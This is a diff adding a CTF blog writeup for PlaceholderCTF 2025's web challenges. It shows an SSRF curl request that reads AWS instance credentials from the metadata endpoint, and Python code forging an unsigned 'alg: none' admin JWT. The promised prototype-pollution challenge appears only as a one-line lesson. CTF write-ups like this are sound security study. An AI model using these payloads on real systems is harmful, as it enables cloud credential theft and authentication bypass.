@@ -1,0 +1,69 @@
+---
+title: "PlaceholderCTF 2025 — Web Challenges Writeup"
+date: "2025-07-15"
+summary: "Writeup for the web category challenges from PlaceholderCTF 2025. Covered SSRF, prototype pollution, and JWT forgery."
+platform: "ctf"
+tags: ["ctf", "web", "ssrf", "jwt", "prototype-pollution"]
+draft: false
+featured: false
+---
+
+> **Event:** PlaceholderCTF 2025  
+> **Category:** Web  
+> **Placement:** Top 10% (placeholder)
+
+## Challenge 1: Internal Recon (SSRF)
+
+### Description
+
+The application fetched user-supplied URLs to generate previews. No SSRF protection was implemented.
+
+### Solution
+
+```bash
+# Probe internal AWS metadata
+curl "https://challenge.placeholder.ctf/fetch?url=http://169.254.169.254/latest/meta-data/"
+```
+
+This revealed instance credentials from the metadata service.
+
+```json
+{
+  "AccessKeyId": "ASIA...",
+  "SecretAccessKey": "...",
+  "Token": "..."
+}
+```
+
+**Flag:** `CTF{placeholder_ssrf_flag}`
+
+---
+
+## Challenge 2: JWT None Algorithm
+
+### Description
+
+The application used JWTs for authentication. The library accepted the `none` algorithm.
+
+### Solution
+
+```python
+import base64, json
+
+# Craft unsigned JWT
+header = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b'=')
+payload = base64.urlsafe_b64encode(json.dumps({"user":"admin","role":"admin"}).encode()).rstrip(b'=')
+token = f"{header.decode()}.{payload.decode()}."
+
+print(token)
+```
+
+**Flag:** `CTF{placeholder_jwt_flag}`
+
+---
+
+## Lessons Learned
+
+- SSRF to cloud metadata is still a very common attack path in CTFs and real assessments
+- Always test JWT `alg: none` on older or misconfigured applications
+- Prototype pollution often appears in Express.js apps using `_.merge` or similar
